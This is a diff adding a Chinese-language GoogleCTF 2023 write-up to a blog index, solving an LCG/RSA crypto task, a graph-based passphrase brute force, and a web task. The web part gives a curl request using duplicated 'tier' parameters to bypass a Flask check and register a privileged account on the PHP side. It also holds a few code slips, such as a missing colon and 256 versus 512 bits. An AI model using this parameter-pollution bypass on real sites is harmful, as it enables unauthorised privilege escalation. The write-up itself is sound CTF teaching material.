@@ -26,6 +26,415 @@
       </tags>
   </entry>
   <entry>
+    <title>GoogleCTF2023 Writeup</title>
+    <url>/posts/851556193/</url>
+    <content><![CDATA[<h1 id="LEAST-COMMON-GENOMINATOR"><a href="#LEAST-COMMON-GENOMINATOR" class="headerlink" title="LEAST COMMON GENOMINATOR?"></a>LEAST COMMON GENOMINATOR?</h1><p><em>Someone used this program to send me an encrypted message but I can’t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?!</em></p>
+<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/4e90c59c2c12ac422f0b83094cca2c3e5c4c7cce464dddc5cb2ad391155f11c96a183290a289dfe1c64cc9e3cd467706f07e621904588ca4def3a4f6906234b7.zip" target="_blank" rel="noopener">Attachment</a></em></p>
+<hr>
+<pre><code class="python"><span class="keyword">from</span> secret <span class="keyword">import</span> config
+<span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA
+<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime
+
+<span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span>
+    lcg_m = config.m
+    lcg_c = config.c
+    lcg_n = config.n
+
+    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, lcg_s)</span>:</span>
+        self.state = lcg_s
+
+    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span>
+        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
+        <span class="keyword">return</span> self.state
+
+<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
+
+    <span class="keyword">assert</span> <span class="number">4096</span> % config.it == <span class="number">0</span>
+    <span class="keyword">assert</span> config.it == <span class="number">8</span>
+    <span class="keyword">assert</span> <span class="number">4096</span> % config.bits == <span class="number">0</span>
+    <span class="keyword">assert</span> config.bits == <span class="number">512</span>
+
+    <span class="comment"># Find prime value of specified bits a specified amount of times</span>
+    seed = <span class="number">211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635</span>
+    lcg = LCG(seed)
+    primes_arr = []
+
+    dump = <span class="literal">True</span>
+    items = <span class="number">0</span>
+    dump_file = open(<span class="string">"dump.txt"</span>, <span class="string">"w"</span>)
+
+    primes_n = <span class="number">1</span>
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        <span class="keyword">for</span> i <span class="keyword">in</span> range(config.it):
+            <span class="keyword">while</span> <span class="literal">True</span>:
+                prime_candidate = lcg.next()
+                <span class="keyword">if</span> dump:
+                    dump_file.write(str(prime_candidate) + <span class="string">'\n'</span>)
+                    items += <span class="number">1</span>
+                    <span class="keyword">if</span> items == <span class="number">6</span>:
+                        dump = <span class="literal">False</span>
+                        dump_file.close()
+                <span class="keyword">if</span> <span class="keyword">not</span> isPrime(prime_candidate):
+                    <span class="keyword">continue</span>
+                <span class="keyword">elif</span> prime_candidate.bit_length() != config.bits:
+                    <span class="keyword">continue</span>
+                <span class="keyword">else</span>:
+                    primes_n *= prime_candidate
+                    primes_arr.append(prime_candidate)
+                    <span class="keyword">break</span>
+
+        <span class="comment"># Check bit length</span>
+        <span class="keyword">if</span> primes_n.bit_length() &gt; <span class="number">4096</span>:
+            print(<span class="string">"bit length"</span>, primes_n.bit_length())
+            primes_arr.clear()
+            primes_n = <span class="number">1</span>
+            <span class="keyword">continue</span>
+        <span class="keyword">else</span>:
+            <span class="keyword">break</span>
+
+    <span class="comment"># Create public key 'n'</span>
+    n = <span class="number">1</span>
+    <span class="keyword">for</span> j <span class="keyword">in</span> primes_arr:
+        n *= j
+    print(<span class="string">"[+] Public Key: "</span>, n)
+    print(<span class="string">"[+] size: "</span>, n.bit_length(), <span class="string">"bits"</span>)
+
+    <span class="comment"># Calculate totient 'Phi(n)'</span>
+    phi = <span class="number">1</span>
+    <span class="keyword">for</span> k <span class="keyword">in</span> primes_arr:
+        phi *= (k - <span class="number">1</span>)
+
+    <span class="comment"># Calculate private key 'd'</span>
+    d = pow(config.e, <span class="number">-1</span>, phi)
+
+    <span class="comment"># Generate Flag</span>
+    <span class="keyword">assert</span> config.flag.startswith(<span class="string">b"CTF{"</span>)
+    <span class="keyword">assert</span> config.flag.endswith(<span class="string">b"}"</span>)
+    enc_flag = bytes_to_long(config.flag)
+    <span class="keyword">assert</span> enc_flag &lt; n
+
+    <span class="comment"># Encrypt Flag</span>
+    _enc = pow(enc_flag, config.e, n)
+
+    <span class="keyword">with</span> open (<span class="string">"flag.txt"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> flag_file:
+        flag_file.write(_enc.to_bytes(n.bit_length(), <span class="string">"little"</span>))
+
+    <span class="comment"># Export RSA Key</span>
+    rsa = RSA.construct((n, config.e))
+    <span class="keyword">with</span> open (<span class="string">"public.pem"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> pub_file:
+        pub_file.write(rsa.exportKey().decode())
+</code></pre>
+<p>分析可知:</p>
+<ul>
+<li><p>flag是使用RSA加密的,已知公🔑 文件,即n,e</p>
+</li>
+<li><p>使用LCG线性同余生成器生成素数</p>
+</li>
+<li><p>已知LCG的种子和前6个连续生成的数字</p>
+</li>
+<li><p>config.it = 8</p>
+</li>
+<li><p>config.bits = 256</p>
+</li>
+</ul>
+<p>LCG是伪随机数生成器和流密码的一种,递推公式是 𝑋𝑛+1=(𝑎𝑋𝑛+𝑐) 𝑚𝑜𝑑 𝑚</p>
+<p>已知初值和随后LCG连续生成的6个值,未知增量、乘数和模数.</p>
+<p>我们可以通过攻击得到这三个值,然后只需要模拟原算法通过LCG得到8个素数后,通过欧拉函数求逆元得到e,解密即可.</p>
+<p>题解:</p>
+<pre><code class="python"><span class="keyword">import</span> math
+<span class="keyword">from</span> functools <span class="keyword">import</span> reduce
+
+<span class="keyword">import</span> gmpy2
+
+<span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA
+<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, isPrime, long_to_bytes
+
+dump_file = open(<span class="string">"dump.txt"</span>)
+output_values = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> dump_file.readlines()]  <span class="comment"># 已知的 LCG 输出值</span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span>
+    <span class="string">"""</span>
+<span class="string">    已知：a,m,s0,s1</span>
+<span class="string">    求c</span>
+<span class="string">    """</span>
+    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * multiplier) % modulus
+    <span class="keyword">return</span> modulus, multiplier, increment
+
+<span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span>
+    <span class="string">"""</span>
+<span class="string">    已知：m,s0,s1,s2</span>
+<span class="string">    求a</span>
+<span class="string">    """</span>
+    multiplier = (
+        (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * gmpy2.invert(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus
+    )  <span class="comment"># 注意这里求逆元</span>
+    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)
+
+<span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span>
+    <span class="string">"""</span>
+<span class="string">    已知：s0-s6</span>
+<span class="string">    求a,c,m</span>
+<span class="string">    """</span>
+    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]
+    zeroes = [t2 * t0 - t1 * t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]
+    modulus = abs(reduce(math.gcd, zeroes))
+    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)
+
+<span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span>
+    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, lcg_m, lcg_c, lcg_n, lcg_s)</span>:</span>
+        self.state = lcg_s
+        self.lcg_m = lcg_m
+        self.lcg_c = lcg_c
+        self.lcg_n = lcg_n
+
+    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span>
+        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
+        <span class="keyword">return</span> self.state
+
+
+m, a, c = crack_unknown_modulus(output_values)
+seed = <span class="number">211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635</span>
+lcg = LCG(a, c, m, seed)
+print(a, c, m)
+primes_n = <span class="number">1</span>
+primes_arr = []
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):
+    <span class="keyword">while</span> <span class="literal">True</span>:
+        prime_candidate = lcg.next()
+        <span class="keyword">if</span> <span class="keyword">not</span> isPrime(prime_candidate):
+            <span class="keyword">continue</span>
+        <span class="keyword">elif</span> prime_candidate.bit_length() != <span class="number">512</span>:
+            <span class="keyword">continue</span>
+        <span class="keyword">else</span>:
+            primes_n *= prime_candidate
+            primes_arr.append(prime_candidate)
+            <span class="keyword">break</span>
+
+print(list(primes_arr))
+
+phi = <span class="number">1</span>
+<span class="keyword">for</span> k <span class="keyword">in</span> primes_arr:
+    phi *= k - <span class="number">1</span>
+
+key = RSA.importKey(open(<span class="string">"public.pem"</span>, <span class="string">"r"</span>).read())
+n = key.n
+e = key.e
+d = gmpy2.invert(e, phi)
+
+enc = open(<span class="string">"flag.txt"</span>, <span class="string">"rb"</span>).read()
+
+flag = pow(int.from_bytes(enc, <span class="string">"little"</span>), d, n)
+print(long_to_bytes(flag))
+</code></pre>
+<p><strong>flag</strong>: <code>CTF{C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy}</code></p>
+<p>参考:</p>
+<ul>
+<li><a href="https://www.codercto.com/a/35743.html" target="_blank" rel="noopener">攻击线性同余生成器(LCG) | 码农网</a></li>
+<li><a href="https://blog.csdn.net/weixin_45883223/article/details/115299389" target="_blank" rel="noopener">LCG(线性同余生成器)_lcg线性同余_WustHandy的博客-CSDN博客</a></li>
+</ul>
+<h1 id="NPC"><a href="#NPC" class="headerlink" title="NPC"></a>NPC</h1><p><em>A friend handed me this map and told me that it will lead me to the flag.<br>It is confusing me and I don’t know how to read it, can you help me out?</em></p>
+<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/9a8f5d47fab0a460f9826c4f13aa1dff2809140e68325fb21edab674ee5ec2476b902d2797c41bd6d9311e3510c9366d739d9404e00aa9d4ffd6a0d88e5bf2ef.zip" target="_blank" rel="noopener">Attachment</a></em></p>
+<hr>
+<p>使用Graphviz工具将<code>hint.dot</code>转换为图片,得到下图</p>
+<pre><code class="shell">dot -Tjpg  hint.dot -o hint.jpg
+</code></pre>
+<p><img data-src="../../CTF/GoogleCTF2023/Misc/assets/hint.jpg" alt="hint.jpg" width="300"></p>
+<p>分析代码:</p>
+<ul>
+<li><p>从<code>USACONST.TXT</code>中随机选择N个单词生成密码,使用<code>passphrase.encrypt(secret, password)</code>对flag加密</p>
+</li>
+<li><p>对于<code>password</code>中的每个字母,创建一个带有唯一ID的节点,并添加到图中</p>
+</li>
+<li><p>按照<code>password</code>的顺序,对密码中相邻的两个字符创建一条边</p>
+</li>
+<li><p>向图中随机添加<code>int(len(password) ** 1.3)</code>条边</p>
+</li>
+<li><p>随机打乱图中节点和边的顺序</p>
+</li>
+<li><p>随机交换一些节点的起点和终点,由于<code>random() % 2</code>只有在<code>random</code>函数返回值为0时才为<code>False</code>,我们假定图中每条边的起点和终点都被交换了一遍</p>
+</li>
+<li><p>将节点和边的信息写入到<code>hint.dot</code>文件中</p>
+</li>
+</ul>
+<p>我是思路是:</p>
+<ol>
+<li><p>遍历words_list中的单词,从每个节点出发,使用DFS判断是否可以在图中找到,这样过滤后得到30个单词,即密码一定由该30个单词中的某几个单词组成</p>
+</li>
+<li><p>枚举密码中所用的单词个数N</p>
+</li>
+<li><p>使用组合数从这30个单词选择N个单词</p>
+</li>
+<li><p>判断所选的N个单词组成的字符集和<code>hint.dot</code>中的字符集是否一致</p>
+</li>
+<li><p>对N个单词进行全排列,并尝试解密 (<em>为了提高效率,这里还用到了多进程</em>)</p>
+</li>
+</ol>
+<p>当N=5时,得到password<code>standardwatersigngivenchosen</code>和<code>flag</code>.</p>
+<p>代码:</p>
+<pre><code class="python"><span class="keyword">import</span> concurrent.futures
+<span class="keyword">import</span> itertools
+<span class="keyword">import</span> re
+<span class="keyword">from</span> collections <span class="keyword">import</span> Counter
+
+<span class="keyword">from</span> pyrage <span class="keyword">import</span> passphrase
+
+<span class="keyword">from</span> encrypt <span class="keyword">import</span> get_word_list
+
+
+<span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span>
+    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, letter)</span>:</span>
+        self.letter = letter
+        self.adjacent = []
+
+    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span> -&gt; str:</span>
+        <span class="keyword">return</span> <span class="string">f"<span class="subst">{self.letter}</span> -&gt; <span class="subst">{[x.letter <span class="keyword">for</span> x <span class="keyword">in</span> self.adjacent]}</span>"</span>
+
+    __repr__ = __str__
+
+<span class="function"><span class="keyword">def</span> <span class="title">build_nodes</span><span class="params">()</span>:</span>
+    pattern = <span class="string">r"\s+(\d+)\s+\[label=(\w+)\];"</span>
+    pattern2 = <span class="string">r"\s+(\d+)\s+--\s+(\d+);$"</span>
+    nodes = dict()
+    <span class="keyword">with</span> open(<span class="string">"hint.dot"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:
+        <span class="keyword">for</span> line <span class="keyword">in</span> f:
+            <span class="keyword">if</span> <span class="string">"label"</span> <span class="keyword">in</span> line
+                match = re.match(pattern, line)
+                node_id = match.group(<span class="number">1</span>)
+                letter = match.group(<span class="number">2</span>)
+                nodes[node_id] = Node(letter)
+            <span class="keyword">elif</span> <span class="string">"--"</span> <span class="keyword">in</span> line:
+                match = re.match(pattern2, line)
+                start = match.group(<span class="number">1</span>)
+                end = match.group(<span class="number">2</span>)
+                <span class="comment"># nodes[start].adjacent.append(nodes[end])</span>
+                nodes[end].adjacent.append(nodes[start])
+    <span class="keyword">return</span> nodes
+
+visited = set()
+
+<span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(node, index, word)</span>:</span>
+    <span class="keyword">if</span> index == len(word):
+        <span class="keyword">return</span> <span class="literal">True</span>
+
+    <span class="keyword">if</span> node.letter != word[index]:
+        <span class="keyword">return</span> <span class="literal">False</span>
+
+    visited.add(node)
+
+    <span class="keyword">for</span> adj <span class="keyword">in</span> node.adjacent:
+        <span class="keyword">if</span> adj <span class="keyword">not</span> <span class="keyword">in</span> visited:
+            <span class="keyword">if</span> dfs(adj, index + <span class="number">1</span>, word):
+                <span class="keyword">return</span> <span class="literal">True</span>
+
+    visited.remove(node)
+    <span class="keyword">return</span> <span class="literal">False</span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(password)</span>:</span>
+    <span class="keyword">with</span> open(<span class="string">"secret.age"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:
+        enc = f.read()
+    <span class="keyword">try</span>:
+        print(<span class="string">"[FLAG] is "</span>, passphrase.decrypt(enc, password))
+        print(<span class="string">"Password is "</span>, password)
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        <span class="keyword">pass</span>
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">filter_words</span><span class="params">(nodes)</span>:</span>
+    ans = set()
+    <span class="keyword">for</span> word <span class="keyword">in</span> get_word_list():
+        visited.clear()
+        <span class="keyword">for</span> node <span class="keyword">in</span> nodes.values():
+            <span class="keyword">if</span> dfs(node, <span class="number">0</span>, word):
+                ans.add(word)
+                <span class="keyword">break</span>
+
+    print(<span class="string">"ans:"</span>, len(ans), ans)
+    <span class="keyword">return</span> ans
+
+
+<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
+    nodes = build_nodes()
+
+    letters = sorted([node.letter <span class="keyword">for</span> node <span class="keyword">in</span> nodes.values()])
+
+    ans = filter_words(nodes)
+    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>, len(ans) + <span class="number">1</span>):
+        print(<span class="string">f"Num is <span class="subst">{num}</span>"</span>)
+        <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.combinations(ans, num):  <span class="comment"># 组合</span>
+            <span class="keyword">if</span> sorted(<span class="string">""</span>.join(comb)) == letters:
+                passwords = [
+                    <span class="string">""</span>.join(perm) <span class="keyword">for</span> perm <span class="keyword">in</span> itertools.permutations(comb, len(comb))
+                ]
+
+                <span class="keyword">with</span> concurrent.futures.ProcessPoolExecutor(max_workers=<span class="number">8</span>) <span class="keyword">as</span> executor:
+                    executor.map(check, passwords)
+
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    main()
+</code></pre>
+<p><strong>flag</strong>: <code>CTF{S3vEn_bR1dg35_0f_K0eN1g5BeRg}</code></p>
+<p>参考:</p>
+<ul>
+<li><a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html?#processpoolexecutor" target="_blank" rel="noopener">concurrent.futures — 启动并行任务 – Python 3.11.4 文档</a></li>
+</ul>
+<h1 id="UNDER-CONSTRUCTION"><a href="#UNDER-CONSTRUCTION" class="headerlink" title="UNDER-CONSTRUCTION"></a>UNDER-CONSTRUCTION</h1><p><em>We were building a web app but the new CEO wants it remade in php.</em></p>
+<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/22790c2f38bd6adde75753641011c223db7e2c0ec718df6e883976ed9c518ca0a86ef67b7e153fd07a9fa734f6a5350028ca266e3bf646f1096d2c4d536ff45a.zip" target="_blank" rel="noopener">Attachment</a></em><br><em><code>https://under-construction-web.2023.ctfcompetition.com</code></em><br><em><code>https://under-construction-php-web.2023.ctfcompetition.com</code></em></p>
+<hr>
+<p>题目提供了Flask和PHP两个站点,用户可以在Flask站点进行注册,注册的账号可以同时用于登录Flask和PHP两个站点.</p>
+<p>分析代码:</p>
+<p>Flask会将HTTP请求原始查询参数转发到PHP应用程序中完成用户注册.</p>
+<pre><code class="python"><span class="comment"># File: /flask/authorized_routes.py</span>
+<span class="meta">@authorized.route('/signup', methods=['POST'])</span>
+<span class="function"><span class="keyword">def</span> <span class="title">signup_post</span><span class="params">()</span>:</span>
+    raw_request = request.get_data()
+    ...
+    requests.post(<span class="string">f"http://<span class="subst">{PHP_HOST}</span>:1337/account_migrator.php"</span>, 
+        headers={<span class="string">"token"</span>: TOKEN, <span class="string">"content-type"</span>: request.headers.get(<span class="string">"content-type"</span>)}, data=raw_request)
+    <span class="keyword">return</span> redirect(url_for(<span class="string">'authorized.login'</span>))
+</code></pre>
+<p>只有<code>gold</code>级别的用户,在PHP站点登录后才可以看到FLAG</p>
+<pre><code class="php"><span class="comment"># File: /php/index.php</span>
+<span class="function"><span class="keyword">function</span> <span class="title">getResponse</span><span class="params">()</span></span>
+<span class="function"></span>{
+    ...
+    $response = <span class="string">"Login successful. Welcome "</span> . htmlspecialchars($username) . <span class="string">"."</span>;
+
+    <span class="keyword">if</span> ($tier === <span class="string">"gold"</span>) {
+        $response .= <span class="string">" "</span> . getenv(<span class="string">"FLAG"</span>);
+    }
+
+    <span class="keyword">return</span> $response;
+}
+</code></pre>
+<p>Flask会对查询参数进行校验,防止创建高权限的用户.</p>
+<pre><code class="python"><span class="comment"># File: /flask/authorized_routes.py</span>
+<span class="meta">@authorized.route('/signup', methods=['POST'])</span>
+<span class="function"><span class="keyword">def</span> <span class="title">signup_post</span><span class="params">()</span>:</span>
+    ...
+    tier = models.Tier(request.form.get(<span class="string">'tier'</span>))
+    <span class="keyword">if</span>(tier == models.Tier.GOLD):
+        flash(<span class="string">'GOLD tier only allowed for the CEO'</span>)
+        <span class="keyword">return</span> redirect(url_for(<span class="string">'authorized.signup'</span>))
+    ...
+</code></pre>
+<p>HTTP查询参数中存在重复的key时,在Flask和PHP有不同的行为,flask会取第一个值,而PHP会取最后一个值.</p>
+<p>因此我们可以构造如下命令,以此绕过Flask对查询参数的校验,并在PHP中注册高权限用户.</p>
+<p><strong>curl</strong></p>
+<pre><code class="shell">curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d "username=admin&amp;password=admin&amp;tier=blue&amp;tier=gold"
+</code></pre>
+<p>然后用上述的用户名和密码去PHP站点登录即可.</p>
+<p><strong>flag</strong>: <code>CTF{ff79e2741f21abd77dc48f17bab64c3d}</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>GoogleCTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GoogleCTF2022 Writeup</title>
     <url>/posts/632988450/</url>
     <content><![CDATA[<h1 id="APPNOTE-TXT"><a href="#APPNOTE-TXT" class="headerlink" title="APPNOTE.TXT"></a>APPNOTE.TXT</h1><p><em>Every single archive manager unpacks this to a different file…</em></p>
